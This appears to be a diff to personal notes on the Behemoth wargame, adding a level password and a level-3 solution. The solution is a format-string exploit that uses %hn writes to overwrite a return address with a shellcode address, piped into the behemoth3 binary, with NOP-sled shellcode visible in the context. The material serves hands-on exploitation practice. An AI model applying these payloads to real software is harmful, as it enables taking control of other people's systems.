@@ -10,6 +10,7 @@ passwords
 1: 8JHFW9vGru
 2: udgJeGECEW
 3: sc5GZjEMld
+4: kCr7E3fqaP
 
 ###################################
 level1
@@ -21,3 +22,15 @@ export shellcode=$(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
 
 ###################################
 level2
+
+###################################
+level3
+
+vulnerability will have something to do with format specifier
+r < <(python3 -c 'print("A" * 4 + "B" * 4 + "C" *4 + "D" * 4 + "." + "%08x." * 4)')
+
+<(printf "AAAA"; printf "\x68\xd2\xff\xff"; printf "BBBB"; printf "\x6a\xd2\xff\xff"; python3 -c 'print("%054876x%hn%010643x%hn")')
+
+shellcode at 0xffffd66c
+address to write this address (return address) 0xffffd268
+(printf "AAAA"; printf "\x68\xd2\xff\xff"; printf "BBBB"; printf "\x6a\xd2\xff\xff"; python3 -c 'print("%054876x%hn%010643x%hn")';cat) | ./behemoth3
